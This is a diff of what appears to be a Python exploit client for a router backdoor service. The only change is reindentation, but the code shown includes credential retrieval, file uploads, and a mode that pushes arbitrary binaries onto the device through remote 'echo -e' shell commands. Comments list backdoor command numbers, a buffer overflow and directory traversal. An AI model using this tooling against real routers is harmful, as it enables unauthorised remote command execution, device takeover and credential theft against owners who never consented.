@@ -109,35 +109,35 @@ elif args.get_credentials :
 	for var, value in credentials:
 		print("{}:{}".format(var, value))
 elif args.send_file:
-    with open(args.send_file, "r") as f:
-        buf = f.read()
-        msg = args.remote_filename + "\0" + buf
-        send_message(s, endianness, 8, msg);
+	with open(args.send_file, "r") as f:
+		buf = f.read()
+		msg = args.remote_filename + "\0" + buf
+		send_message(s, endianness, 8, msg);
 elif args.send_file2:
-    CHUNK = 1024
-    fdst = "/tmp/" + args.remote_filename
-    send_message(s, endianness, 7, "rm " + fdst)
-    with open(args.send_file2, "rb") as f:
-        while True:
-            buf = f.read(CHUNK)
-            if len(buf) == 0:
-                break
-            cmd = 'echo -n -e "' + ''.join(map(lambda c: "\\x{:02x}".format(ord(c)), buf))+'"'
-            cmd += ' >>' + fdst
-            try:
-                send_message(s, endianness, 7, cmd)
-            except socket.timeout:
-                print("Timeout, reconnect...")
-                s.close()
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(args.timeout)
-                s.connect((args.ip, args.port))
-                # Get current size
-                ls = send_message(s, endianness, 7, "ls -l " + fdst)
-                size = int(re.split('[ \t]+', ls)[4])
-                # Let's start from here
-                print("Seek from %d..." % size)
-                f.seek(size)
+	CHUNK = 1024
+	fdst = "/tmp/" + args.remote_filename
+	send_message(s, endianness, 7, "rm " + fdst)
+	with open(args.send_file2, "rb") as f:
+		while True:
+			buf = f.read(CHUNK)
+			if len(buf) == 0:
+				break
+			cmd = 'echo -n -e "' + ''.join(map(lambda c: "\\x{:02x}".format(ord(c)), buf))+'"'
+			cmd += ' >>' + fdst
+			try:
+				send_message(s, endianness, 7, cmd)
+			except socket.timeout:
+				print("Timeout, reconnect...")
+				s.close()
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+				s.settimeout(args.timeout)
+				s.connect((args.ip, args.port))
+				# Get current size
+				ls = send_message(s, endianness, 7, "ls -l " + fdst)
+				size = int(re.split('[ \t]+', ls)[4])
+				# Let's start from here
+				print("Seek from %d..." % size)
+				f.seek(size)
 elif args.get_var is not None :
 	response = send_message(s, endianness, 2, args.get_var)[1].rstrip("\x00")
 	if len(response) == 0 :
@@ -186,7 +186,7 @@ s.close()
 # other commands :
 #		integer overflow in stdout handling (?) not exploitable but still ...
 #		buffer overflow (buffer de 0x10000)
-#		 
+#
 # 8 : write file (file name in payload, dir : tmp, directory traversa)
 # 9 : print version
 #10 : print modem router ip (nvram_get(lan_ipaddr))
